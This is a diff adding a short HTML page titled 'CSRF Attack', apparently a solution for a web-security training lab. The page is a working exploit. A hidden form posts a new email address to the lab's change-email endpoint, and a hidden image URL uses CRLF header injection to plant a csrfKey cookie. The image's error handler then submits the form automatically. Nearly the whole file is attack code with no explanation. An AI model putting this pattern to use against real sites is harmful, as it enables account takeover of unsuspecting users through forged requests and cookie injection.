@@ -1,0 +1,14 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack</title>
+</head>
+<body>
+    <form action="https://0ad100be03b0fe4580a626a200b0006a.web-security-academy.net/my-account/change-email" method="POST" id="csrf-form">
+        <input type="hidden" name="email" value="attacked@gmail.com">
+        <input type="hidden" name="csrf" value="bTJHQufl4fcp1yGjXrRYkmuJhFKszCcp">
+    </form>
+    <img style="display:none;" src="https://0ad100be03b0fe4580a626a200b0006a.web-security-academy.net/?search=hat%0d%0aSet-Cookie:%20csrfKey=9Qm00rmRtPeICyLnT1JYJfG9rdmoUbft%3b%20SameSite=None" onerror="document.forms[0].submit()">
+</body>
+</html>
+
